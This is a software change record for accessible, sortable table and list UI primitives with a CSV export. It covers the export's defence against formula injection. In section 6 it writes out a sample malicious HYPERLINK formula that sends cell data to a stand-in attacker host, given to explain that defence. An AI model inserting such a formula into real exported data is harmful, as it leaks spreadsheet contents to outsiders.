# BR-021 — Table and list primitives, the accessible alternative to every visualization

| Field | Value |
| --- | --- |
| Sub-step | STEP-003.04 |
| Requirements | REQ-A11Y-002 (also REQ-A11Y-003) |
| Author | Deepesh Kumar Gupta |
| Date | 2026-08-07 |

> **Numbering note:** the sub-step front-matter named `BR-017`. This record is `BR-021`; the front-matter has been corrected.

## 1. Intent (step 1)
Accessible, sortable, virtualised table and list primitives with CSV export — built **before** any chart or map, so the non-visual path is the foundation rather than a retrofit.

## 2. Graph state (step 2 — all six fields)
| Field | Value |
| --- | --- |
| Repository / branch | journeylab / `main` |
| HEAD at analysis | `c358d4b` |
| Graph indexed commit | `c358d4b` |
| **Match?** | **Yes** |
| Index timestamp | verified at analysis time |
| Extractor / schema version | **Not exposed** — recorded, not invented |
| Coverage and known gaps | Python and TypeScript indexed |
| Status | **RUNNABLE** — `impact(panels.tsx, upstream, 3)` returned `epistemic: exact`, LOW, 2 direct |

## 3. Target nodes (step 4)
`packages/ui/src/data/` — `csv.ts`, `table.tsx`. Also `feedback/dialog.tsx` (removed a dead lint suppression).

## 4. Dependencies (step 5 — graph-derived)
`epistemic: exact`, risk LOW, 2 direct on the sibling this sits beside (`index.ts`, the feedback test). Nothing existing is modified beyond the suppression removal.

**Inbound:** none — no screen consumes these yet.
**Outbound:** React 19.2 only. **No virtualisation library**, deliberately — see §9.

## 5. Impact by category (step 6 — all twelve, enumerated)
| # | Category | Affected | Confidence |
| --- | --- | --- | --- |
| 1 | Requirements / scope steps | `REQ-A11Y-002`; underpins `REQ-A11Y-003`. Prerequisite for STEP-013 (every chart needs its table equivalent) | High |
| 2 | Owners / consumers | Sole owner | High |
| 3 | Frontend routes / components | **The non-visual path for every future visualization.** STEP-013 charts must pair with this, not replace it | High |
| 4 | Backend services / workflows / jobs | **None** | High |
| 5 | APIs / schemas / clients / webhooks | **None** | High |
| 6 | Events / producers / consumers | **None** | High |
| 7 | Tables / migrations / caches / indexes | **None** | High |
| 8 | Datasets / models / prompts / retrievers / evals | **None** | High |
| 9 | Tests / fixtures / contract suites | **+27 tests** (179 in `packages/ui`) | High |
| 10 | Services / deployments / infrastructure | **None** — no new dependency | High |
| 11 | Dashboards / alerts / runbooks | **None** | High |
| 12 | Documentation / deprecation commitments | Sub-step record; tracker | High |

## 6. Data-flow inspection (step 7 — export is a security surface)
CSV export is not a formatting convenience; it is a path by which user-supplied text reaches another person's spreadsheet.

| Hop | Element | Risk | Evidence |
| --- | --- | --- | --- |
| 1 | Free-text cell (trip note, comment) | **Formula injection** | Cells starting `=`, `+`, `-`, `@`, tab or CR are prefixed with `'` |
| 2 | Cell containing delimiter/quote/newline | Malformed file | RFC 4180 quoting, doubled quotes |
| 3 | Non-ASCII place names | Mojibake | UTF-8 BOM by default |
| 4 | Virtualised table export | **Silent truncation** | Export uses the full sorted set, never the rendered window — asserted |

**The injection case in detail.** A trip note reading `=HYPERLINK("https://evil.example/?d="&A1,"Click me")` exfiltrates the adjacent cell when a colleague opens the shared export. The attacker never touches our servers — they type into a field we faithfully export, and the spreadsheet executes it. Our data makes this worse than average: briefs and collaborator comments are free text, and exports are meant to be shared.

## 7. Classification (step 8)
`direct` · `accessibility` · `security/privacy` (CSV injection) · `unknown`: none.

## 8. Risk scoring (step 9)
| Dimension | 1–5 | Rationale |
| --- | --- | --- |
| Likelihood of unintended effect | 2 | Nothing consumes it yet |
| Severity if it occurs | **4** | A virtualised table lying about its size misleads a screen-reader user with no way to discover otherwise; an unescaped export runs attacker-supplied formulas on a colleague's machine |
| Reach | **5** | Every dataset surface, and every future chart's accessible equivalent |
| Detectability | 1 | Row counts and injection both asserted; 6/6 mutants killed |
| Reversibility | 1 | Nothing depends on it |
| **Confidence** | 4 | Graph runnable; every claim executed |
| Customer criticality | 2 | Accessibility is a product promise; export safety protects third parties |

**Overall: MEDIUM.**

## 9. Unknown or low-confidence areas
| Area | Why uncertain | Residual risk |
| --- | --- | --- |
| **No virtualisation library was adopted** | The sub-step warns "virtualisation libraries frequently break AT row counts — verify the chosen one early" | **Deliberately deferred.** `virtualWindow` is a plain prop: the caller decides which slice to render, and the component keeps `aria-rowcount`/`aria-rowindex` correct regardless. Any library adopted later must be checked against these tests, which now exist first |
| No windowing/scroll behaviour | Only the ARIA contract is implemented | **Open** — real virtualisation (measurement, scroll sync) arrives with the first large dataset, STEP-011 |
| jsdom is not a browser | Row-count announcement is asserted structurally, not heard | **Open** — STEP-003.08 |
| Keyboard cell navigation is header-level only | Sortable headers are reachable; arrow-key grid navigation is not implemented | **Open and stated.** A native `<table>` is already navigable by screen-reader table commands; a roving-tabindex grid is a heavier pattern worth adding only when a dataset needs it |

## 10. Required actions (step 10)
Caption and header scope; sort with `aria-sort` on the sorted column only; ARIA row counts that describe the dataset rather than the DOM; CSV with RFC 4180 quoting, formula-injection defence and a BOM; export the full set; a list alternative that keeps every header attached to its value.

## 11. Approval (step 11)
MEDIUM — owner approval; single owner, self-approved (`ADR-010`).

## 12. Post-change verification
| Field | Value |
| --- | --- |
| Re-indexed at commit | post-commit re-index |
| `detect_changes()` | New `packages/ui/src/data/`; one dead suppression removed |
| Regression R1–R7 | **PASS** — 335 Python + 41 web + 179 UI; R7 12/12; meta-suite 36/36 |
| Mutation testing | **6/6 killed** |

## 13. Disposition
**Merged.** Biome flagged a suppression comment I had added defensively that suppressed nothing — the rule never fired. Removed rather than left: a suppression claiming a rule applies where it does not teaches the next reader to trust a constraint that is not there.
